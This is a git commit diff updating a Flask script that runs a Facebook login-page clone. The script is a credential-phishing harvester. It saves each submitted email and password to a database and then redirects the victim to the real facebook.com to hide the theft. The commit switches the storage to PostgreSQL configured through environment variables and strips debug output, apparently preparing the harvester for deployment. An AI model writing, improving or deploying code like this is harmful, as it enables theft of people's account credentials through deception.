d7323e22b308500a44ccce99098c8ded50705c22
Jpconwi <jpconwi2005@gmail.com>
2025-06-12 17:49:39 +0800

    Update fbdata.py

--- facebook/fbdata.py
+++ facebook/fbdata.py
@@ -1,17 +1,16 @@
-from flask import Flask, render_template, request
-import mysql.connector
-from flask import redirect, url_for
-
-
+from flask import Flask, render_template, request, redirect
+import psycopg2
+import os
 
 app = Flask(__name__)
 
 def get_db_connection():
-    return mysql.connector.connect(
-        host='localhost',
-        user='root',
-        password='',  # Add your root password here if any
-        database='fbclone'  # Your DB name in XAMPP
+    return psycopg2.connect(
+        dbname=os.environ.get("DB_NAME"),
+        user=os.environ.get("DB_USER"),
+        password=os.environ.get("DB_PASSWORD"),
+        host=os.environ.get("DB_HOST"),
+        port=os.environ.get("DB_PORT", 5432)
     )
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -19,8 +18,6 @@ def login():
     if request.method == 'POST':
         email = request.form.get('email')
         password = request.form.get('password')
-
-        print(f"Received email: {email}, password: {password}")  # Debug
 
         try:
             conn = get_db_connection()
@@ -32,18 +29,16 @@ def login():
             conn.commit()
             cursor.close()
             conn.close()
-            print("Insert successful")
             return redirect("https://www.facebook.com")
         except Exception as e:
             print(f"Database error: {e}")
             return "Failed to save login info."
 
-    # GET request
     return render_template('fblogin.html')
+
 @app.route('/success')
 def login_success():
     return "<h2>Login info saved successfully!</h2>"
-
 
 if __name__ == '__main__':
     app.run(debug=True)
